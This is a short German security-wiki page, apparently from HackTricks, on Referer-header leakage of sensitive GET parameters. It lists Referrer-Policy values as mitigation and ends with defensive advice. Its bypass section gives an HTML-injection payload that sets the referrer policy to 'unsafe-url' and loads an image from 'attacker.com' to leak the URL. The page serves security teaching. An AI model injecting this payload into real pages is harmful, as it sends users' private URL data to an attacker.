{{#include ./banners/hacktricks-training.md}}

# Referrer-Header und Richtlinie

Referrer ist der Header, der von Browsern verwendet wird, um anzugeben, welche die vorherige besuchte Seite war.

## Sensible Informationen geleakt

Wenn sich zu irgendeinem Zeitpunkt innerhalb einer Webseite sensible Informationen in den GET-Anforderungsparametern befinden, und die Seite Links zu externen Quellen enthält oder ein Angreifer in der Lage ist, den Benutzer dazu zu bringen, eine von ihm kontrollierte URL zu besuchen (Social Engineering), könnte es möglich sein, die sensiblen Informationen aus der letzten GET-Anforderung zu exfiltrieren.

## Minderung

Sie können den Browser dazu bringen, eine **Referrer-Policy** zu befolgen, die **verhindern** könnte, dass sensible Informationen an andere Webanwendungen gesendet werden:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Gegenmaßnahmen

Sie können diese Regel mit einem HTML-Meta-Tag überschreiben (der Angreifer muss eine HTML-Injection ausnutzen):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Verteidigung

Setzen Sie niemals sensible Daten in GET-Parametern oder Pfaden in der URL ein.

{{#include ./banners/hacktricks-training.md}}
